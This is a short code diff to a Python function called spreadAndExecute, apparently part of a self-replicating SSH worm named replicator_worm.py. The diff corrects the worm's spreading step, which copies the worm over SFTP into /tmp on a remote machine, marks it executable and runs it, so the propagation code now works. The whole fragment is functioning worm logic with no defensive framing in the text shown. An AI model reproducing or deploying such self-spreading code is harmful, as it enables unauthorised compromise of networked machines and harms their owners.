@@ -76,8 +76,8 @@ def spreadAndExecute(sshClient):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
-	sftpClient.put("replicator_worm.py","/tmp/"+"replicator_worm.py")
-	sshClient.exec_command("chmod a+x python /tmp/replicator_worm.py")
+	sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py")
 	
 
